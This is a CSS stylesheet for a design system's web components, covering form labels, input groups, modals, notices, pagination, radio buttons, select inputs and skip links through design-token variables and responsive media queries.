.stamp-form-field-helper-text { grid-area: helper-text; margin-block-start: calc(-1 * var(--stamp-spacing-inner-xs)); margin-block-end: var(--stamp-spacing-inner-s); color: var(--stamp-color-text-default); font-family: var(--stamp-text-body-s-default-font-family), sans-serif; font-weight: var(--stamp-text-body-s-default-font-weight); line-height: var(--stamp-text-body-s-default-line-height); font-size: var(--stamp-text-body-s-default-font-size); letter-spacing: var(--stamp-text-body-s-default-letter-spacing); }

.stamp-form-field-helper-text--variant-subtle { color: var(--stamp-color-text-subtle); }

.stamp-form-field-label { font-family: var(--stamp-text-form-label-font-family), sans-serif; font-weight: var(--stamp-text-form-label-font-weight); line-height: var(--stamp-text-form-label-line-height); font-size: var(--stamp-text-form-label-font-size); letter-spacing: var(--stamp-text-form-label-letter-spacing); display: flex; align-items: center; gap: var(--stamp-spacing-inner-xs); }

.stamp-form-field-label__suffix { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-form-field-label--variant-default { font-family: var(--stamp-text-form-label-font-family), sans-serif; font-weight: var(--stamp-text-form-label-font-weight); line-height: var(--stamp-text-form-label-line-height); font-size: var(--stamp-text-form-label-font-size); letter-spacing: var(--stamp-text-form-label-letter-spacing); }

.stamp-form-field-label--variant-subtle { font-family: var(--stamp-text-body-m-default-font-family); font-weight: var(--stamp-text-body-m-default-font-weight); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); line-height: var(--stamp-text-body-m-default-line-height); }

.stamp-form-field-label-group { display: flex; align-items: center; gap: var(--stamp-spacing-inner-m); }

.stamp-form-information-button { display: flex; cursor: pointer; border: medium; border-radius: 50%; background-color: unset; color: var(--stamp-color-background-icon-button-primary-default); }

.stamp-form-information-button:hover { font-family: var(--stamp-text-cta-hover-font-family), sans-serif; font-weight: var(--stamp-text-cta-hover-font-weight); line-height: var(--stamp-text-cta-hover-line-height); text-decoration: var(--stamp-text-cta-hover-text-decoration); font-size: var(--stamp-text-cta-hover-font-size); }

.stamp-form-information-button:active { font-family: var(--stamp-text-cta-pressed-font-family), sans-serif; font-weight: var(--stamp-text-cta-pressed-font-weight); line-height: var(--stamp-text-cta-pressed-line-height); text-decoration: var(--stamp-text-cta-pressed-text-decoration); font-size: var(--stamp-text-cta-pressed-font-size); }

.stamp-form-information-button:focus { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }

@supports selector(:focus-visible) {
  .stamp-form-information-button:focus { outline: none; }
  .stamp-form-information-button:focus-visible { outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; outline-color: var(--stamp-color-border-focus-outline); }
}

.stamp-form-information-button:active { color: var(--stamp-color-background-icon-button-primary-pressed); }

.stamp-input-group { position: relative; display: flex; justify-content: stretch; align-items: center; inline-size: 100%; }

.stamp-input-group input { inline-size: 100%; padding-inline-end: calc(
        var(--stamp-size-icon-m) + var(--stamp-spacing-inner-m) + var(--stamp-spacing-inner-s)
    ); }

.stamp-input-group input:disabled + .stamp-input-group__append { color: var(--stamp-color-icon-disabled); }

.stamp-input-group__append { position: absolute; display: flex; inset-inline-end: 0px; inset-block-start: 50%; cursor: pointer; border-width: medium; border-style: none; border-image: none; background-color: transparent; line-height: var(--stamp-text-cta-default-line-height); color: var(--stamp-color-icon-default); border-color: var(--stamp-color-border-button-primary-default); margin: var(--stamp-spacing-inner-s); border-radius: var(--stamp-radius-s); transform: translateY(calc(-1 * (50% + var(--stamp-spacing-inner-s)))); }

.stamp-input-group__append:disabled { color: var(--stamp-color-icon-disabled); cursor: not-allowed; }

.stamp-input-group__append:not(:disabled):hover { color: var(--stamp-color-icon-hover); }

.stamp-input-group__append:not(:disabled):active { color: var(--stamp-color-icon-pressed); }

.stamp-input-group__append:focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); }

@supports selector(:focus-visible) {
  .stamp-input-group__append:focus { outline: none; }
  .stamp-input-group__append:focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-input-group--size-narrow { inline-size: 50%; }

.stamp-input-group--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-input-group { inline-size: 50%; }
  .stamp-input-group--size-narrow { inline-size: 25%; }
  .stamp-input-group--size-full { inline-size: 100%; }
}

.stamp-link-list { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-l); list-style: none; }

.stamp-link-list-item { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); color: var(--stamp-color-text-default); }

.stamp-link-list-item .stamp-link__icon--start { block-size: var(--stamp-size-icon-m); max-block-size: var(--stamp-size-icon-m); max-inline-size: var(--stamp-size-icon-m); }

.stamp-link-list-emphasis { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-l); list-style: none; }

@media screen and (min-width: 481px) {
  .stamp-link-list-emphasis { display: grid; grid-template-columns: 1fr 1fr; }
}

.stamp-link-list-emphasis-item { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); color: var(--stamp-color-text-default); display: flex; flex-direction: column; justify-content: center; background-color: var(--stamp-color-background-surface); border-width: var(--stamp-border-width-s); border-style: solid; border-color: transparent; border-radius: var(--stamp-radius-m); }

.stamp-link-list-emphasis-item .stamp-link, .stamp-link-list-emphasis-item .stamp-link:hover { display: flex; justify-content: flex-start; align-items: center; padding-block: var(--stamp-spacing-inner-l); padding-inline: var(--stamp-spacing-inner-xl); }

.stamp-link-list-emphasis-item .stamp-link:focus { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: var(--stamp-spacing-inner-xxs); border-radius: calc(var(--stamp-radius-m) - 1px); }

.stamp-link-list-emphasis-item .stamp-link:active { border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-icon-pressed); color: var(--stamp-color-text-link-pressed); border-radius: var(--stamp-radius-m); margin: -1px; }

@supports selector(:focus-visible) {
  .stamp-link-list-emphasis-item .stamp-link:focus { outline: none; }
  .stamp-link-list-emphasis-item .stamp-link:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: var(--stamp-spacing-inner-xxs); border-radius: calc(var(--stamp-radius-m) - 1px); }
}

.stamp-link-list-emphasis-item .stamp-link__content { display: inline-flex; inline-size: 100%; justify-content: space-between; align-items: center; word-break: break-word; }

.stamp-link-list-emphasis-item .stamp-link__icon--start { block-size: var(--stamp-size-icon-m); max-block-size: var(--stamp-size-icon-m); max-inline-size: var(--stamp-size-icon-m); }

.stamp-link-list-emphasis-item--theme-default { background-color: var(--stamp-color-background-variant); }

.stamp-link-list-emphasis-item--theme-subdued { background-color: var(--stamp-color-background-surface); }

.stamp-list-basic { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-s); list-style-position: outside; }

.stamp-list-basic--disc { list-style-type: disc; padding-inline-start: 18px; }

.stamp-list-basic--decimal { list-style-type: decimal; padding-inline-start: 14px; }

.stamp-list-basic--check, .stamp-list-basic--none { list-style-type: none; }

.stamp-list-basic--check { margin-inline-start: -4px; }

.stamp-list-basic-item { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); color: var(--stamp-color-text-default); }

.stamp-list-basic-item--check { display: flex; align-items: center; justify-content: flex-start; }

.stamp-list-basic-item--decimal { padding-inline-start: 10px; }

.stamp-list-basic-item--disc { padding-inline-start: 6px; }

.stamp-list-basic-item__check-icon { align-self: flex-start; flex-shrink: 0; color: var(--stamp-color-icon-brand); margin-inline-end: 4px; }

.stamp-list-basic-item--size-small .stamp-list-basic-item__check-icon { inline-size: 19px; block-size: 19px; }

.stamp-list-basic-item--size-large .stamp-list-basic-item__check-icon { inline-size: 27px; block-size: 27px; }

.stamp-list-emphasis { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-xxl); }

.stamp-list-emphasis-item { list-style-type: none; }

.stamp-list-emphasis-item__heading { display: flex; flex-direction: column; align-items: flex-start; gap: var(--stamp-spacing-inner-s); color: var(--stamp-color-text-default); margin-block-end: var(--stamp-spacing-inner-s); }

.stamp-list-emphasis-item__index { display: flex; justify-content: center; align-items: center; inline-size: var(--stamp-spacing-inner-xl); block-size: var(--stamp-spacing-inner-xl); border-radius: var(--stamp-radius-s) var(--stamp-radius-s) 0 var(--stamp-radius-s); background-color: var(--stamp-color-background-inverse); color: var(--stamp-color-text-inverse); flex-shrink: 0; font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); }

.stamp-list-emphasis-item__title { font-family: var(--stamp-text-heading-s-font-family), sans-serif; font-weight: var(--stamp-text-heading-s-font-weight); line-height: var(--stamp-text-heading-s-line-height); font-size: var(--stamp-text-heading-s-font-size); letter-spacing: var(--stamp-text-heading-s-letter-spacing); }

@media (min-width: 481px) {
  .stamp-list-emphasis-item__heading { flex-direction: row; align-items: center; gap: var(--stamp-spacing-inner-m); justify-content: flex-start; }
}

@media screen and (min-width: 481px) {
  .stamp-loader { display: flex; }
}

.stamp-loader__content { display: flex; flex-direction: column; align-items: center; }

.stamp-loader__van { display: flex; justify-content: center; align-items: center; aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-xxl); }

@media screen and (min-width: 481px) {
  .stamp-loader__van { aspect-ratio: var(--aspect-ratio-medium); inline-size: var(--stamp-size-medium-illustration-s); }
  .stamp-loader__van ~ .stamp-loader__waiting-text { font-family: var(--stamp-text-body-l-default-font-family), sans-serif; font-weight: var(--stamp-text-body-l-default-font-weight); font-size: var(--stamp-text-body-l-default-font-size); letter-spacing: var(--stamp-text-body-l-default-letter-spacing); }
}

.stamp-loader__waiting-text { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-loader__button { margin-block-start: var(--stamp-spacing-inner-xl); }

.stamp-loader__waiting-text--hidden, .stamp-loader__button--hidden { visibility: hidden; }

.stamp-loader__spinner { color: var(--stamp-color-icon-brand); }

.stamp-modal { position: relative; border: medium; margin: auto; background-color: var(--stamp-color-background-surface); max-inline-size: var(--max-inline-modal-size); border-radius: var(--stamp-radius-m); max-height: unset; }

.stamp-modal:focus { outline: none; }

.stamp-modal::backdrop { background: rgba(0, 0, 0, 0.6); }

.stamp-modal--size-s { --max-inline-modal-size: 416px; margin-inline: var(--stamp-spacing-inner-xl); max-block-size: 80dvh; }

@media screen and (min-width: 481px) {
  .stamp-modal--size-s { inline-size: 100%; margin-inline: auto; }
}

.stamp-modal--size-m { --max-inline-modal-size: 576px; }

@media screen and (min-width: 481px) {
  .stamp-modal--size-m { max-block-size: 80dvh; }
}

@media screen and (max-width: 576px) {
  .stamp-modal--size-m { border-radius: 0px; }
  .stamp-modal--size-m .stamp-modal__content { block-size: 100dvh; inline-size: 100dvw; margin: 0px; }
}

.stamp-modal--size-l { --max-inline-modal-size: 900px; margin: auto; }

@media screen and (min-width: 481px) {
  .stamp-modal--size-l { max-block-size: 80dvh; }
}

@media screen and (max-width: 900px) {
  .stamp-modal--size-l { border-radius: 0px; }
  .stamp-modal--size-l .stamp-modal__content { block-size: 100dvh; inline-size: 100dvw; margin: 0px; }
}

.stamp-modal__content { display: grid; grid-template-rows: min-content auto min-content; gap: var(--stamp-spacing-inner-s); position: relative; inline-size: 100%; background-color: var(--stamp-color-background-surface); overflow: visible; }

.stamp-modal__dismiss-button { position: absolute; top: 0px; right: 0px; padding: 0px; margin: var(--stamp-spacing-inner-xxs); border: medium; background: none; cursor: pointer; }

.stamp-modal-actions { display: flex; flex-direction: column-reverse; justify-content: flex-end; gap: var(--stamp-spacing-outer-xs); padding: var(--stamp-spacing-inner-xl); padding-block-start: unset; }

@media screen and (min-width: 481px) {
  .stamp-modal-actions { flex-direction: row; }
  .stamp-modal-actions { padding: var(--stamp-spacing-inner-3-xl); padding-block-start: unset; }
}

.stamp-modal-actions--fixed { position: sticky; inset-block-end: 0px; background-color: var(--stamp-color-background-surface); inline-size: 100%; max-inline-size: var(--max-inline-modal-size); padding-block: var(--stamp-spacing-inner-xl); padding-inline: var(--stamp-spacing-inner-xl); box-shadow: rgba(31, 30, 47, 0.15) 0px -2px 6px 0px; }

@media screen and (min-width: 481px) {
  .stamp-modal-actions--fixed { padding-inline: var(--stamp-spacing-inner-3-xl); padding-block-end: var(--stamp-spacing-inner-3-xl); }
}

.stamp-modal-body { padding-inline: var(--stamp-spacing-inner-xl); padding-block-end: var(--stamp-spacing-inner-m); color: var(--stamp-color-text-default); }

@media screen and (min-width: 481px) {
  .stamp-modal-body { padding-inline: var(--stamp-spacing-inner-3-xl); }
}

.stamp-modal-header { padding: var(--stamp-spacing-inner-xl); padding-block-end: unset; }

@media screen and (min-width: 481px) {
  .stamp-modal-header { padding: var(--stamp-spacing-inner-3-xl); padding-block-end: unset; }
}

.stamp-notice { display: flex; justify-content: center; padding: var(--stamp-spacing-inner-l); inline-size: 100%; }

.stamp-notice__wrapper { position: relative; z-index: var(--z-index-above); background-color: var(--stamp-color-background-surface); }

.stamp-notice__content { display: flex; align-items: flex-start; inline-size: 100%; }

@media screen and (min-width: 481px) {
  .stamp-notice__content { max-inline-size: 532px; }
}

.stamp-notice--variant-warning { border-bottom-style: solid; border-bottom-width: var(--stamp-border-width-s); border-bottom-color: var(--stamp-color-border-warning); background-color: var(--stamp-color-background-warning); }

.stamp-notice--variant-error { border-bottom-style: solid; border-bottom-width: var(--stamp-border-width-s); border-bottom-color: var(--stamp-color-border-negative); background-color: var(--stamp-color-background-negative); }

.stamp-notice--variant-information { border-bottom-style: solid; border-bottom-width: var(--stamp-border-width-s); border-bottom-color: var(--stamp-color-border-informative); background-color: var(--stamp-color-background-informative); }

.stamp-notice__text { display: flex; flex-direction: column; flex-grow: 1; margin-inline: var(--stamp-spacing-inner-m); }

.stamp-notice__text + .stamp-notice__dismiss-button { margin-inline-start: calc(var(--stamp-spacing-inner-m) * -1); }

.stamp-notice__icon--success { color: var(--stamp-color-icon-positive); }

.stamp-notice__icon--warning { color: var(--stamp-color-icon-warning); }

.stamp-notice__icon--error { color: var(--stamp-color-icon-negative); }

.stamp-notice__icon--information { color: var(--stamp-color-icon-informative); }

.stamp-notice__dismiss-button { cursor: pointer; background-color: transparent; border: medium; color: var(--stamp-color-icon-subtle); }

.stamp-notice__dismiss-button:hover { color: var(--stamp-color-icon-hover); }

.stamp-notice__dismiss-button:active { color: var(--stamp-color-icon-pressed); }

.stamp-notice__dismiss-button:focus { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-border-width-m); }

@supports selector(:focus-visible) {
  .stamp-notice__dismiss-button:focus { outline: none; }
  .stamp-notice__dismiss-button:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-border-width-m); }
}

.stamp-notice__dismiss-icon { display: flex; }

.stamp-notice a { border-radius: var(--stamp-radius-s); }

.stamp-notice a:not(:disabled):focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-notice a:not(:disabled):focus { outline: none; }
  .stamp-notice a:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-notice-title strong { font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); }

.stamp-paging { display: flex; align-items: center; }

.stamp-paging--size-s, .stamp-paging--size-m { justify-content: space-between; }

.stamp-paging--size-l { justify-content: center; gap: clamp(0px, -53.3333px + 16.6667vi, 20px); }

.stamp-paging__pages { list-style: none; display: flex; justify-content: center; }

.stamp-paging__item { block-size: var(--stamp-size-icon-l); inline-size: var(--stamp-size-icon-l); }

.stamp-paging__item--ellipsis { padding: var(--stamp-spacing-inner-xs); display: flex; align-items: center; justify-content: center; color: var(--stamp-color-text-default); }

a.stamp-paging__item--navigation, .stamp-paging__item--navigation { block-size: 100%; inline-size: 100%; display: flex; justify-content: center; align-items: center; color: var(--stamp-color-text-link-default); font-family: var(--stamp-text-cta-default-font-family), sans-serif; font-weight: var(--stamp-text-cta-default-font-weight); font-size: var(--stamp-text-cta-default-font-size); text-decoration: none; appearance: none; border: medium; background: none; cursor: pointer; border-radius: var(--stamp-radius-s); }

.stamp-paging__item--navigation:disabled, .stamp-paging__item--navigation[disabled] { display: none; }

a.stamp-paging__item--navigation:hover, .stamp-paging__item--navigation:hover { color: var(--stamp-color-text-link-default); text-decoration: var(--stamp-text-hyperlink-default-text-decoration); }

.stamp-paging__item--active a.stamp-paging__item--navigation, .stamp-paging__item--active .stamp-paging__item--navigation { border: var(--stamp-border-width-m) solid var(--stamp-color-border-selected); color: var(--stamp-color-text-link-subtle); }

a.stamp-paging__item--navigation:active, .stamp-paging__item--navigation:active { color: var(--stamp-color-text-link-pressed); text-decoration: var(--stamp-text-hyperlink-default-text-decoration); }

@supports selector(:focus-visible) {
  a.stamp-paging__item--navigation:focus, .stamp-paging__item--navigation:focus { outline: none; }
  a.stamp-paging__item--navigation:focus-visible, .stamp-paging__item--navigation:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-password-input { position: relative; inline-size: 100%; }

.stamp-password-input .stamp-password-input__input { inline-size: 100%; }

.stamp-password-input--size-narrow { inline-size: 50%; }

.stamp-password-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-password-input { inline-size: 50%; }
  .stamp-password-input--size-narrow { inline-size: 25%; }
  .stamp-password-input--size-full { inline-size: 100%; }
}

.stamp-password-input__toggle-button { display: flex; align-items: center; gap: var(--stamp-spacing-inner-s); border: medium; background-color: transparent; cursor: pointer; font-family: var(--stamp-text-cta-default-font-family); font-weight: var(--stamp-text-cta-default-font-weight); font-size: var(--stamp-text-cta-default-font-size); letter-spacing: var(--stamp-text-cta-default-letter-spacing); color: var(--stamp-color-text-link-default); outline-offset: var(--stamp-spacing-inner-xxs); position: absolute; right: 0px; top: 0px; transform: translateY(calc(-100% - var(--stamp-spacing-inner-s))); }

.stamp-password-input__toggle-button:focus { border-radius: var(--stamp-radius-xs); outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

.stamp-radio-button { position: relative; }

.stamp-radio-button--disabled .stamp-radio-button__label { cursor: not-allowed; border-color: var(--stamp-color-border-disabled); }

.stamp-radio-button--invalid .stamp-radio-button__label { border-color: var(--stamp-color-border-error); }

.stamp-radio-button__label { position: relative; cursor: pointer; padding-inline-start: var(--stamp-spacing-inner-4-xl); padding-inline-end: var(--stamp-spacing-inner-l); min-block-size: 72px; display: flex; align-items: center; border-style: solid; border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-fallback); border-radius: var(--stamp-radius-xs); background-color: var(--stamp-color-background-variant); color: var(--stamp-color-text-form-control-value-default); }

.stamp-radio-button__illustration { position: relative; margin-inline-start: calc(var(--stamp-spacing-inner-m) * -1); opacity: var(--stamp-opacity-illustration-default); mix-blend-mode: var(--stamp-blend-mode-default); }

.stamp-radio-button--disabled .stamp-radio-button__illustration { opacity: var(--stamp-opacity-illustration-disabled); mix-blend-mode: var(--stamp-blend-mode-disabled); }

.stamp-radio-button__illustration-badge { display: block; position: absolute; inline-size: 30%; block-size: 30%; inset-block-start: 12%; inset-inline-end: 8%; }

.stamp-radio-button__illustration-badge .stamp-icon, .stamp-radio-button__illustration-badge svg { display: block; inline-size: 100%; block-size: 100%; }

.stamp-radio-button__text-content { display: flex; flex-direction: column; padding-block: calc(var(--stamp-spacing-inner-l) - var(--stamp-border-width-s)); padding-inline-start: var(--stamp-spacing-inner-s); }

.stamp-radio-button:not(.stamp-radio-button--disabled):hover .stamp-radio-button__label { border-color: var(--stamp-color-border-hover); }

.stamp-radio-button .stamp-radio-button__input:focus ~ .stamp-radio-button__label { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 5px; }

@supports selector(:focus-visible) {
  .stamp-radio-button .stamp-radio-button__input:focus ~ .stamp-radio-button__label { outline: none; }
  .stamp-radio-button .stamp-radio-button__input:focus-visible ~ .stamp-radio-button__label { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 5px; }
}

.stamp-radio-button__title { font-family: var(--stamp-text-form-label-font-family), sans-serif; font-weight: var(--stamp-text-form-label-font-weight); line-height: var(--stamp-text-form-label-line-height); font-size: var(--stamp-text-form-label-font-size); letter-spacing: var(--stamp-text-form-label-letter-spacing); }

.stamp-radio-button__message { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-radio-button__input { appearance: none; font: inherit; margin: 0px; padding: calc(var(--stamp-spacing-inner-xs) - var(--stamp-border-width-s)); inline-size: 20px; block-size: 20px; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-strong); border-radius: 50%; position: absolute; inset-inline-start: var(--stamp-spacing-inner-l); inset-block-start: 50%; transform: translateY(-50%); z-index: 1; background-color: var(--stamp-color-background-surface); }

.stamp-radio-button__input:checked:not(:disabled)::after { content: &quot;&quot;; position: absolute; inline-size: 100%; block-size: 100%; inset-inline-start: 0px; inset-block-start: 0px; border-radius: 50%; padding: calc(var(--stamp-spacing-inner-xs) - var(--stamp-border-width-s)); background: var(--stamp-color-icon-selected) content-box; }

.stamp-radio-button__input:focus-visible { outline: none; }

.stamp-radio-button--disabled .stamp-radio-button__input { cursor: not-allowed; background-color: var(--stamp-color-background-disabled); border-color: var(--stamp-color-border-disabled); }

.stamp-radio-button__input:disabled:checked { background: linear-gradient(
                to right,
                var(--stamp-color-icon-disabled) 0,
                var(--stamp-color-icon-disabled) 100%
            )
            content-box,
        var(--stamp-color-background-disabled); }

.stamp-radio-button__input:checked:not(:disabled) ~ .stamp-radio-button__label::before { content: &quot;&quot;; position: absolute; inset-inline-start: calc(-1 * (var(--stamp-border-width-s))); inset-block-start: calc(-1 * var(--stamp-border-width-s)); inline-size: calc(100% + (2 * var(--stamp-border-width-s))); block-size: calc(100% + (2 * var(--stamp-border-width-s))); outline: 2px solid var(--stamp-color-border-selected); outline-offset: 2px; border-radius: var(--stamp-radius-xs); }

.stamp-radio-button--invalid .stamp-radio-button__input:checked:not(:disabled) ~ .stamp-radio-button__label { border-color: var(--stamp-color-border-error); }

.stamp-radio-button__input--disabled ~ .stamp-radio-button__label { background-color: var(--stamp-color-background-disabled); color: var(--stamp-color-text-form-control-value-disabled); }

.stamp-radio-input { appearance: none; font: inherit; margin: 0px; padding: calc(var(--stamp-spacing-inner-xs) - var(--stamp-border-width-s)); inline-size: 20px; block-size: 20px; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-strong); border-radius: 50%; flex-shrink: 0; align-self: start; margin-block-start: 2px; background-color: var(--stamp-color-background-surface); }

.stamp-radio-input:hover:enabled { border-color: var(--stamp-color-border-hover); }

.stamp-radio-input:not(.stamp-radio-input--invalid):checked:not(:disabled) { background: var(--stamp-color-icon-selected) content-box; }

.stamp-radio-input--invalid:checked { background: var(--stamp-color-icon-negative) content-box; }

.stamp-radio-input:focus-visible { outline-offset: 1px; outline-width: var(--stamp-border-width-m); outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); }

.stamp-radio-input:disabled { cursor: not-allowed; background-color: var(--stamp-color-background-disabled); border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-disabled); }

.stamp-radio-input:disabled:checked { background: linear-gradient(
                to right,
                var(--stamp-color-icon-disabled) 0,
                var(--stamp-color-icon-disabled) 100%
            )
            content-box,
        var(--stamp-color-background-disabled); }

.stamp-radio-input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-requirement-list { padding: 0px; margin: 0px; }

.stamp-requirement-list-item { list-style-type: none; min-block-size: var(--stamp-size-icon-m); font-family: var(--stamp-text-form-feedback-font-family); font-weight: var(--stamp-text-form-feedback-font-weight); font-size: var(--stamp-text-form-feedback-font-size); letter-spacing: var(--stamp-text-form-feedback-letter-spacing); }

.stamp-requirement-list-item--disc { list-style-type: disc; margin-left: 20px; font-family: var(--stamp-text-body-s-default-font-family); font-weight: var(--stamp-text-body-s-default-font-weight); font-size: var(--stamp-text-body-s-default-font-size); letter-spacing: var(--stamp-text-body-s-default-letter-spacing); }

.stamp-requirement-list-item--icon { margin-left: -4px; }

.stamp-requirement-list-item__content { display: flex; }

.stamp-requirement-list-item--met { color: var(--stamp-color-text-positive); }

.stamp-requirement-list-item--unmet { color: var(--stamp-color-text-negative); }

.stamp-select-input { padding-inline-start: var(--stamp-spacing-inner-l); padding-inline-end: var(--stamp-spacing-inner-xxl); padding-block: var(--stamp-spacing-inner-s); border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-strong); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); border-radius: var(--stamp-radius-s); border-style: solid; background-position: calc(100% - 16px) center; background-repeat: no-repeat; background-attachment: scroll; background-image: url(&quot;&quot;); background-size: auto; background-origin: padding-box; background-clip: border-box; appearance: none; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; font-weight: var(--stamp-text-body-m-default-font-weight); inline-size: 100%; background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); -webkit-text-fill-color: var(--stamp-color-text-form-control-value-default); }

.stamp-select-input:not(:disabled):hover { border-color: var(--stamp-color-border-hover); }

.stamp-select-input:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

.stamp-select-input:disabled { border-color: var(--stamp-color-border-disabled); cursor: not-allowed; background-position: calc(100% - 16px) center; background-repeat: no-repeat; background-attachment: scroll; background-image: url(&quot;&quot;); background-size: auto; background-origin: padding-box; background-clip: border-box; background-color: var(--stamp-color-background-default); -webkit-text-fill-color: var(--stamp-color-text-form-control-value-disabled); color: var(--stamp-color-text-form-control-value-disabled); }

.stamp-select-input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-select-input--size-narrow { inline-size: 50%; }

.stamp-select-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-select-input { inline-size: 50%; }
  .stamp-select-input--size-narrow { inline-size: 25%; }
  .stamp-select-input--size-full { inline-size: 100%; }
}

.stamp-skip-links:focus-within { display: flex; justify-content: center; }

.stamp-skip-link, a.stamp-skip-link { display: block; align-items: center; justify-content: center; gap: var(--stamp-spacing-inner-s); cursor: pointer; font-family: var(--stamp-text-cta-default-font-family), sans-serif; font-weight: var(--stamp-text-cta-default-font-weight); line-height: var(--stamp-text-cta-default-line-height); font-size: var(--stamp-text-cta-default-font-size); letter-spacing: var(--stamp-text-cta-default-letter-spacing); color: var(--stamp-color-text-link-default); border-radius: var(--stamp-radius-xs); border: medium; background: var(--stamp-color-background-surface); padding-inline: var(--stamp-spacing-inner-s); padding-block: 0px; position: absolute; inset-inline-start: -10000px; inset-block-start: auto; overflow: hidden; z-index: 99999; inline-size: auto; block-size: auto; }

.stamp-skip-link:hover { font-family: var(--stamp-text-cta-hover-font-family), sans-serif; font-weight: var(--stamp-text-cta-hover-font-weight); line-height: var(--stamp-text-cta-hover-line-height); text-decoration: var(--stamp-text-cta-hover-text-decoration); font-size: var(--stamp-text-cta-hover-font-size); color: var(--stamp-color-text-link-hover); }

.stamp-skip-link:active { font-family: var(--stamp-text-cta-pressed-font-family), sans-serif; font-weight: var(--stamp-text-cta-pressed-font-weight); line-height: var(--stamp-text-cta-pressed-line-height); text-decoration: var(--stamp-text-cta-pressed-text-decoration); font-size: var(--stamp-text-cta-pressed-font-size); color: var(--stamp-color-text-link-pressed); }

.stamp-skip-link:focus { position: fixed; inset-inline-start: 50%; transform: translateX(-50%); outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); }

.stamp-step-navigation { inline-size: 100%; z-index: var(--z-index-base); }

